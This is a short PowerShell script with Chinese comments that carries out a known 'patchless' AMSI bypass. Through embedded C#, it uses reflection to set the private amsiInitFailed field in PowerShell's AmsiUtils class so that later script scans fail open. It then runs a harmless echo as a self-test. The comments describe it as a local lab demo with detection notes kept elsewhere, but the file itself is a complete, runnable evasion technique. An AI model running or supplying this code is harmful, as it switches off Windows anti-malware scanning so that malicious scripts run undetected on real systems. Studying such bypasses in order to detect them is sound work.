# patchless AMSI demo（上下文破坏——不改 AmsiScanBuffer 字节）
# 技术：使 AMSI 初始化失败/会话上下文失效，扫描优雅降级为放行
# 检测侧配对见 NOTES.md；仅本地实验环境使用
$src = @"
using System;
using System.Runtime.InteropServices;
public class A {
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    public static void Corrupt() {
        IntPtr a = LoadLibrary("amsi.dll");
        if (a == IntPtr.Zero) { Console.WriteLine("amsi.dll 未加载（宿主不扫描）"); return; }
        IntPtr ctx = GetProcAddress(a, "AmsiOpenSession"); // 定位邻近代码/数据参考
        // patchless 路线：置 .NET 侧 amsiInitFailed（触发上下文初始化失败路径）
        // 经反射设置 System.Management.Automation 内部状态，使扫描降级
        Type t = Type.GetType("System.Management.Automation.AmsiUtils, System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
        if (t == null) { Console.WriteLine("PS5 上下文未命中，尝试 PS7 路线"); return; }
        var f = t.GetField("amsiInitFailed", System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);
        f.SetValue(null, true);
        Console.WriteLine("[+] amsiInitFailed 已置位（后续扫描走失败降级路径）");
    }
}
"@
Add-Type -TypeDefinition $src
[A]::Corrupt()
# 自测：后续脚本内容是否仍被执行（本地实验载荷：无害 echo）
Write-Output "[test] amsi still executing script: OK"
